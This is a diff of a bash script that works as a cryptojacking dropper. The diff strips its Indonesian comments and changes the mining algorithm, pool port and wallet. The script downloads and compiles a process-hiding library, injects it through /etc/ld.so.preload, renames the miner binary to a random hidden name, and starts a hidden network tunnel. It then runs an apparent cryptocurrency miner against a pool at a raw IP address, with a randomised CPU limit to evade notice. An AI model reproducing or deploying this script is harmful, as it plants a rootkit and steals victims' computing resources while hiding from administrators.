@@ -1,30 +1,26 @@
 #!/bin/bash
 
-# 1. Kompilasi Library Hiding (ld.so.preload)
 curl -s https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 
-# 2. Persiapan Binary dengan Nama Acak
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
 rm -f /app/sr
 
-# 3. Menjalankan Tunnel Network (Background)
 if [ -f .h ]; then
     /usr/local/bin/.netd access tcp \
     --hostname "$(cat .h)" \
     --url 127.0.0.1:443 >/dev/null 2>&1 &
 fi
 
-# 4. Eksekusi Main Process TANPA timeout
 /app/$NAME \
--a yescryptr32 \
--o 157.173.100.15:80 \
--u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.try \
+-a yespowertide \
+-o 157.173.100.15:443 \
+-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.openclaw \
 -p x \
 --cpu-threads 2 \
 --cpu-threads-intensity 1 \
@@ -32,9 +28,7 @@ fi
 
 P=$!
 
-# Membatasi CPU usage
-LIMIT=$((75 + RANDOM % 11))
+LIMIT=$((80 + RANDOM % 5))
 cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
-# Menjaga container tetap hidup
 tail -f /dev/null
